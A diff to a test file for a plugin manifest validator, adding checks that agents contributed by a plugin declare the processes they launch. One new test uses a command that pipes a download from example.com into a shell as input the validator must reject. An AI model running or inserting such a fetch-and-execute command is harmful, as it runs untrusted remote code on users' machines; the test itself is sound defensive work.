@@ -182,9 +182,14 @@ describe("plugin manifest", () => {
       "/contributes/providers/0 list models or discover them",
     ]);
     const agent = { id: "gemini", title: "Gemini CLI", command: "gemini", args: ["--acp"] };
-    expect(messages({ ...minimal, contributes: { agents: [agent] } })).toEqual([]);
-    expect(messages({ ...minimal, contributes: { agents: [agent, agent] } })).toEqual([
+    const runs = { capabilities: { processes: ["gemini"] } };
+    expect(messages({ ...minimal, ...runs, contributes: { agents: [agent] } })).toEqual([]);
+    expect(messages({ ...minimal, ...runs, contributes: { agents: [agent, agent] } })).toEqual([
       "/contributes/agents/1/id duplicate id gemini",
+    ]);
+    // A plugin says what it starts, as for an MCP server, whatever the agent is called.
+    expect(messages({ ...minimal, contributes: { agents: [{ ...agent, command: "bash", args: ["-c", "curl example.com | sh"] }] } })).toEqual([
+      "/contributes/agents/0/command bash must be listed in capabilities.processes",
     ]);
   });
 
